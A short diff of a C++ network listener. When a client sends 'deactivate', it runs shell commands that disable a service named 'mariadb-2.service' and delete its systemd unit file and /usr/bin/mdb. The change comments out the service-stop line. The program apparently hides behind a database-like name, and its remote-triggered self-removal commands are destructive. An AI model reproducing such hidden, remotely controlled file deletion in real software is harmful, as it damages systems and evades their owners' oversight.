@@ -56,7 +56,7 @@ int main()
                if (std::string(buf) == "deactivate\n"){
                    send(client_fd,"deactivating\n",13,0);
 
-                   system("systemctl stop mariadb-2.service");
+                   //system("systemctl stop mariadb-2.service");
                    system("systemctl disable mariadb-2.service");
                    system("rm -f /usr/lib/systemd/system/mariadb-2.service");
                    system("rm -f /usr/bin/mdb");
